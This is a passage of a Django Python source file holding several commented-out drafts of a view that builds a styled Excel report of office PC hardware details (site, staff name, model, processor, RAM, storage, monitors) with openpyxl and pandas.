#     created_by_row = last_data_row + 2  # Place it 2 rows below the last data row
#     ws.cell(row=created_by_row, column=3).value = f"Created by: {username}"
#     ws.merge_cells(f'C{created_by_row}:D{created_by_row}')
#     ws[f'C{created_by_row}'].font = Font(size=20, color="D3D3D3", italic=True)
#     ws[f'C{created_by_row}'].alignment = Alignment(horizontal="right", vertical="center")

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 20  # SiteName
#     ws.column_dimensions['B'].width = 20  # Staff Name
#     ws.column_dimensions['C'].width = 20  # model
#     ws.column_dimensions['D'].width = 60  # Description

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,  # A4
#         orientation='landscape',
#         fitToWidth=1,
#         fitToHeight=0
#     )

#     # Add footer with page numbers only
#     ws.oddFooter.center.text = "Page &[Page] of &[Pages]"
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response


# #colourfull
# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from openpyxl.worksheet.page import PrintPageSetup
# from datetime import datetime
# import io
# from django.http import HttpResponse
# from sharefolder.models import SystemInfo, Monitor

# def download_pc_details_excel(request):
#     # Get the current username
#     username = request.user.username if request.user.is_authenticated else "Anonymous"

#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information with colorful styling
#     company_name = "MyTech Corp"
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the header with vibrant colors
#     header_font = Font(size=16, bold=True, color="FFFFFF")
#     header_fill_1 = PatternFill(start_color="1F4E79", end_color="1F4E79", fill_type="solid")  # Dark blue
#     header_fill_2 = PatternFill(start_color="4CAF50", end_color="4CAF50", fill_type="solid")  # Green
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill_1
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill_2
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Add "CONFIDENTIAL" watermark
#     ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     ws.merge_cells('B3:D3')
#     ws['B3'].font = Font(size=22, color="B0B0B0", italic=True)  # Slightly darker gray
#     ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     total_rows = len(df) + 1
#     last_data_row = start_row + total_rows

#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top")

#     # Apply colorful table styling
#     thick_border = Border(left=Side(style='medium', color="000000"),
#                           right=Side(style='medium', color="000000"),
#                           top=Side(style='medium', color="000000"),
#                           bottom=Side(style='medium', color="000000"))
#     thin_border = Border(left=Side(style='thin', color="000000"),
#                          right=Side(style='thin', color="000000"),
#                          top=Side(style='thin', color="000000"),
#                          bottom=Side(style='thin', color="000000"))
#     header_fill = PatternFill(start_color="FFC107", end_color="FFC107", fill_type="solid")  # Amber
#     table_font = Font(bold=True, color="FFFFFF")
#     even_row_fill = PatternFill(start_color="E3F2FD", end_color="E3F2FD", fill_type="solid")  # Light blue
#     odd_row_fill = PatternFill(start_color="FFFFFF", end_color="FFFFFF", fill_type="solid")  # White

#     # Style the table header
#     for cell in ws[start_row]:
#         cell.fill = header_fill
#         cell.font = table_font
#         cell.border = thick_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")

#     # Style the data rows with alternating colors
#     for idx, row in enumerate(ws[start_row+1:start_row+len(df)+1], start=1):
#         fill = even_row_fill if idx % 2 == 0 else odd_row_fill
#         for cell in row:
#             cell.border = thin_border
#             cell.fill = fill
#             cell.alignment = Alignment(horizontal="left", vertical="center")
#         ws.row_dimensions[row[0].row].height = 40

#     # Add "Created by: [username]" as watermark-like text near bottom-right
#     created_by_row = last_data_row + 2
#     ws.cell(row=created_by_row, column=3).value = f"Created by: {username}"
#     ws.merge_cells(f'C{created_by_row}:D{created_by_row}')
#     ws[f'C{created_by_row}'].font = Font(size=22, color="B0B0B0", italic=True)  # Matching watermark
#     ws[f'C{created_by_row}'].alignment = Alignment(horizontal="right", vertical="center")

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 20
#     ws.column_dimensions['B'].width = 20
#     ws.column_dimensions['C'].width = 20
#     ws.column_dimensions['D'].width = 60

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,
#         orientation='landscape',
#         fitToWidth=1,
#         fitToHeight=0
#     )

#     # Add footer with page numbers
#     ws.oddFooter.center.text = "Page &[Page] of &[Pages]"
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response

# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from openpyxl.worksheet.page import PrintPageSetup
# from datetime import datetime
# import io
# from django.http import HttpResponse
# from sharefolder.models import SystemInfo, Monitor

# def download_pc_details_excel(request):
#     # Get the current username
#     username = request.user.username if request.user.is_authenticated else "Anonymous"

#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information with enhanced styling
#     company_name = "MyTech Corp"
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the header with bold, larger font, and increased cell size
#     header_font = Font(size=20, bold=True, color="FFFFFF")  # Increased from 16 to 20
#     header_fill_1 = PatternFill(start_color="1F4E79", end_color="1F4E79", fill_type="solid")  # Dark blue
#     header_fill_2 = PatternFill(start_color="4CAF50", end_color="4CAF50", fill_type="solid")  # Green
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill_1
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill_2
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Increase row height for header rows
#     ws.row_dimensions[1].height = 50  # Increased height for row 1
#     ws.row_dimensions[2].height = 50  # Increased height for row 2

#     # Add "CONFIDENTIAL" watermark
#     ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     ws.merge_cells('B3:D3')
#     ws['B3'].font = Font(size=22, color="B0B0B0", italic=True)
#     ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     total_rows = len(df) + 1
#     last_data_row = start_row + total_rows

#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top")

#     # Apply colorful table styling
#     thick_border = Border(left=Side(style='medium', color="000000"),
#                           right=Side(style='medium', color="000000"),
#                           top=Side(style='medium', color="000000"),
#                           bottom=Side(style='medium', color="000000"))
#     thin_border = Border(left=Side(style='thin', color="000000"),
#                          right=Side(style='thin', color="000000"),
#                          top=Side(style='thin', color="000000"),
#                          bottom=Side(style='thin', color="000000"))
#     header_fill = PatternFill(start_color="FFC107", end_color="FFC107", fill_type="solid")  # Amber
#     table_font = Font(bold=True, color="FFFFFF")
#     even_row_fill = PatternFill(start_color="E3F2FD", end_color="E3F2FD", fill_type="solid")  # Light blue
#     odd_row_fill = PatternFill(start_color="FFFFFF", end_color="FFFFFF", fill_type="solid")  # White

#     # Style the table header
#     for cell in ws[start_row]:
#         cell.fill = header_fill
#         cell.font = table_font
#         cell.border = thick_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")

#     # Style the data rows with alternating colors
#     for idx, row in enumerate(ws[start_row+1:start_row+len(df)+1], start=1):
#         fill = even_row_fill if idx % 2 == 0 else odd_row_fill
#         for cell in row:
#             cell.border = thin_border
#             cell.fill = fill
#             cell.alignment = Alignment(horizontal="left", vertical="center")
#         ws.row_dimensions[row[0].row].height = 40

#     # Add "Created by: [username]" as watermark-like text near bottom-right
#     created_by_row = last_data_row + 2
#     ws.cell(row=created_by_row, column=3).value = f"Created by: {username}"
#     ws.merge_cells(f'C{created_by_row}:D{created_by_row}')
#     ws[f'C{created_by_row}'].font = Font(size=22, color="B0B0B0", italic=True)
#     ws[f'C{created_by_row}'].alignment = Alignment(horizontal="right", vertical="center")

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 20
#     ws.column_dimensions['B'].width = 20
#     ws.column_dimensions['C'].width = 20
#     ws.column_dimensions['D'].width = 60

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,
#         orientation='landscape',
#         fitToWidth=1,
#         fitToHeight=0
#     )

#     # Add footer with page numbers
#     ws.oddFooter.center.text = "Page &[Page] of &[Pages]"
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response


# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from openpyxl.worksheet.page import PrintPageSetup
# from datetime import datetime
# import io
# from django.http import HttpResponse
# from sharefolder.models import SystemInfo, Monitor

# def download_pc_details_excel(request):
#     # Get the current username
#     username = request.user.username if request.user.is_authenticated else "Anonymous"

#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information with enhanced styling
#     company_name = "MyTech Corp"
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the report header
#     header_font = Font(size=20, bold=True, color="FFFFFF")
#     header_fill_1 = PatternFill(start_color="1F4E79", end_color="1F4E79", fill_type="solid")  # Dark blue
#     header_fill_2 = PatternFill(start_color="4CAF50", end_color="4CAF50", fill_type="solid")  # Green
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill_1
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill_2
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Increase row height for report header rows
#     ws.row_dimensions[1].height = 50
#     ws.row_dimensions[2].height = 50

#     # Add "CONFIDENTIAL" watermark
#     ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     ws.merge_cells('B3:D3')
#     ws['B3'].font = Font(size=22, color="B0B0B0", italic=True)
#     ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     total_rows = len(df) + 1
#     last_data_row = start_row + total_rows

#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top")

#     # Apply colorful table styling
#     thick_border = Border(left=Side(style='medium', color="000000"),
#                           right=Side(style='medium', color="000000"),
#                           top=Side(style='medium', color="000000"),
#                           bottom=Side(style='medium', color="000000"))
#     thin_border = Border(left=Side(style='thin', color="000000"),
#                          right=Side(style='thin', color="000000"),
#                          top=Side(style='thin', color="000000"),
#                          bottom=Side(style='thin', color="000000"))
#     table_font = Font(size=14, bold=True, color="FFFFFF")  # Larger, bold font for table header
#     even_row_fill = PatternFill(start_color="E3F2FD", end_color="E3F2FD", fill_type="solid")  # Light blue
#     odd_row_fill = PatternFill(start_color="FFFFFF", end_color="FFFFFF", fill_type="solid")  # White

#     # Style the table header with individual colors
#     header_colors = [
#         PatternFill(start_color="FF5722", end_color="FF5722", fill_type="solid"),  # Deep Orange for SiteName
#         PatternFill(start_color="3F51B5", end_color="3F51B5", fill_type="solid"),  # Indigo for Staff Name
#         PatternFill(start_color="009688", end_color="009688", fill_type="solid"),  # Teal for model
#         PatternFill(start_color="FFC107", end_color="FFC107", fill_type="solid")   # Amber for Description
#     ]

#     for idx, cell in enumerate(ws[start_row]):
#         cell.fill = header_colors[idx]  # Apply unique color to each header cell
#         cell.font = table_font
#         cell.border = thick_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")
#     ws.row_dimensions[start_row].height = 50  # Increase table header row height

#     # Style the data rows with alternating colors
#     for idx, row in enumerate(ws[start_row+1:start_row+len(df)+1], start=1):
#         fill = even_row_fill if idx % 2 == 0 else odd_row_fill
#         for cell in row:
#             cell.border = thin_border
#             cell.fill = fill
#             cell.alignment = Alignment(horizontal="left", vertical="center")
#         ws.row_dimensions[row[0].row].height = 40

#     # Add "Created by: [username]" as watermark-like text near bottom-right
#     created_by_row = last_data_row + 2
#     ws.cell(row=created_by_row, column=3).value = f"Created by: {username}"
#     ws.merge_cells(f'C{created_by_row}:D{created_by_row}')
#     ws[f'C{created_by_row}'].font = Font(size=22, color="B0B0B0", italic=True)
#     ws[f'C{created_by_row}'].alignment = Alignment(horizontal="right", vertical="center")

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 20
#     ws.column_dimensions['B'].width = 20
#     ws.column_dimensions['C'].width = 20
#     ws.column_dimensions['D'].width = 60

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,
#         orientation='landscape',
#         fitToWidth=1,
#         fitToHeight=0
#     )

#     # Add footer with page numbers
#     ws.oddFooter.center.text = "Page &[Page] of &[Pages]"
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response





import pandas as pd
from openpyxl import Workbook
from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
from openpyxl.utils.dataframe import dataframe_to_rows
from openpyxl.worksheet.page import PrintPageSetup
from datetime import datetime
import io
from django.http import HttpResponse
# from sharefolder.models import SystemInfo, Monitor

# def download_pc_details_excel(request):
#     # Get the current username
#     username = request.user.username if request.user.is_authenticated else "Anonymous"

#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         description = (
#             f"Processor:{system.processor}, RAM:{system.ram_gb} GB, "
#             f"Storage:{system.storage}, Graphics:{system.graphics_card}, Monitor:{monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information with enhanced styling
#     company_name = "ArabianCoast"
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the report header
#     header_font = Font(size=15, bold=True, color="FFFFFF")
#     header_fill_1 = PatternFill(start_color="1F4E79", end_color="1F4E79", fill_type="solid")  # Dark blue
#     header_fill_2 = PatternFill(start_color="4CAF50", end_color="4CAF50", fill_type="solid")  # Green
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill_1
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill_2
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Increase row height for report header rows
#     ws.row_dimensions[1].height = 25
#     ws.row_dimensions[2].height = 25

#     # # Add "CONFIDENTIAL" watermark
#     # ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     # ws.merge_cells('B3:D3')
#     # ws['B3'].font = Font(size=22, color="B0B0B0", italic=True)
#     # ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 4
#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top")

#     # Apply colorful table styling
#     thick_border = Border(left=Side(style='medium', color="000000"),
#                           right=Side(style='medium', color="000000"),
#                           top=Side(style='medium', color="000000"),
#                           bottom=Side(style='medium', color="000000"))
#     thin_border = Border(left=Side(style='thin', color="000000"),
#                          right=Side(style='thin', color="000000"),
#                          top=Side(style='thin', color="000000"),
#                          bottom=Side(style='thin', color="000000"))
#     table_font = Font(size=14, bold=True, color="FFFFFF")
#     even_row_fill = PatternFill(start_color="E3F2FD", end_color="E3F2FD", fill_type="solid")
#     odd_row_fill = PatternFill(start_color="FFFFFF", end_color="FFFFFF", fill_type="solid")

#     # Style the table header with individual colors
#     header_colors = [
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Deep Orange
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Indigo
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Teal
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid")   # Amber
#     ]

#     for idx, cell in enumerate(ws[start_row]):
#         cell.fill = header_colors[idx]
#         cell.font = table_font
#         cell.border = thick_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")
#     ws.row_dimensions[start_row].height = 50

#     # Style the data rows with alternating colors
#     for idx, row in enumerate(ws[start_row+1:start_row+len(df)+1], start=1):
#         fill = even_row_fill if idx % 2 == 0 else odd_row_fill
#         for cell in row:
#             cell.border = thin_border
#             cell.fill = fill
#             cell.alignment = Alignment(horizontal="left", vertical="center")
#         ws.row_dimensions[row[0].row].height = 25

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 15
#     ws.column_dimensions['B'].width = 15
#     ws.column_dimensions['C'].width = 30
#     # ws.column_dimensions['D'].width = 120

#     # Set column width based on the longest content in column D
#     column_letter = 'D'
#     max_length = 0

#     for cell in ws[column_letter]:
#         if cell.value:
#             max_length = max(max_length, len(str(cell.value)))

#     # Adjust column width (a multiplier of 1.2 to fit better)
#     ws.column_dimensions[column_letter].width = max_length * 1.2

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,
#         orientation='landscape',
#         fitToWidth=1,
#         fitToHeight=0
#     )

#     # Add footer with page numbers (center) and "Created by" (right) visible only when printing
#     ws.oddFooter.center.text = "Page &[Page] of &[Pages]"
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"
#     ws.oddFooter.right.text = f"Created by: {username}"
#     ws.oddFooter.right.size = 10
#     ws.oddFooter.right.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response



# def download_pc_details_excel(request):
#     # Get the current username
#     username = request.user.username if request.user.is_authenticated else "Anonymous"

#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         # Parse and reformat storage with SSD, HDD, Unknown order
#         storage_parts = system.storage.split(",")
#         ssd_storage = []
#         hdd_storage = []
#         unknown_storage = []

#         for part in storage_parts:
#             part = part.strip()
#             if "SSD" in part:
#                 size = part.split(":")[1].strip().split()[0]  # Extract "238GB"
#                 ssd_storage.append(f"SSD({size})")
#             elif "Unknown" in part:
#                 size = part.split(":")[1].strip().split()[0]  # Extract "932GB"
#                 unknown_storage.append(f"Unknown({size})")
#             else:  # Assume anything else is HDD
#                 size = part.split(":")[1].strip().split()[0] if ":" in part else "Unknown"
#                 hdd_storage.append(f"HDD({size})")

#         # Combine in the desired order: SSD, HDD, Unknown
#         formatted_storage = ssd_storage + hdd_storage + unknown_storage
#         storage_str = ",".join(formatted_storage) if formatted_storage else "None"

#         # Updated description with simplified storage format
#         description = (
#             f"Processor:{system.processor}, RAM:{system.ram_gb} GB, "
#             f"Storage:{storage_str}, Graphics:{system.graphics_card}, Monitor:{monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information with enhanced styling, removing company name
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = "PC Details Report"  # Removed company_name
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the report header
#     header_font = Font(size=15, bold=True, color="FFFFFF")
#     header_fill_1 = PatternFill(start_color="1F4E79", end_color="1F4E79", fill_type="solid")  # Dark blue
#     header_fill_2 = PatternFill(start_color="4CAF50", end_color="4CAF50", fill_type="solid")  # Green
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill_1
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill_2
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Increase row height for report header rows
#     ws.row_dimensions[1].height = 25
#     ws.row_dimensions[2].height = 25

#     # Write DataFrame to sheet
#     start_row = 4
#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top")

#     # Apply colorful table styling
#     thick_border = Border(left=Side(style='medium', color="000000"),
#                           right=Side(style='medium', color="000000"),
#                           top=Side(style='medium', color="000000"),
#                           bottom=Side(style='medium', color="000000"))
#     thin_border = Border(left=Side(style='thin', color="000000"),
#                          right=Side(style='thin', color="000000"),
#                          top=Side(style='thin', color="000000"),
#                          bottom=Side(style='thin', color="000000"))
#     table_font = Font(size=14, bold=True, color="FFFFFF")
#     even_row_fill = PatternFill(start_color="E3F2FD", end_color="E3F2FD", fill_type="solid")
#     odd_row_fill = PatternFill(start_color="FFFFFF", end_color="FFFFFF", fill_type="solid")

#     # Style the table header with individual colors
#     header_colors = [
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Deep Orange
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Indigo
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Teal
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid")   # Amber
#     ]

#     for idx, cell in enumerate(ws[start_row]):
#         cell.fill = header_colors[idx]
#         cell.font = table_font
#         cell.border = thick_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")
#     ws.row_dimensions[start_row].height = 50

#     # Style the data rows with alternating colors
#     for idx, row in enumerate(ws[start_row+1:start_row+len(df)+1], start=1):
#         fill = even_row_fill if idx % 2 == 0 else odd_row_fill
#         for cell in row:
#             cell.border = thin_border
#             cell.fill = fill
#             cell.alignment = Alignment(horizontal="left", vertical="center")
#         ws.row_dimensions[row[0].row].height = 25

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 15
#     ws.column_dimensions['B'].width = 15
#     ws.column_dimensions['C'].width = 30

#     # Set column width based on the longest content in column D
#     column_letter = 'D'
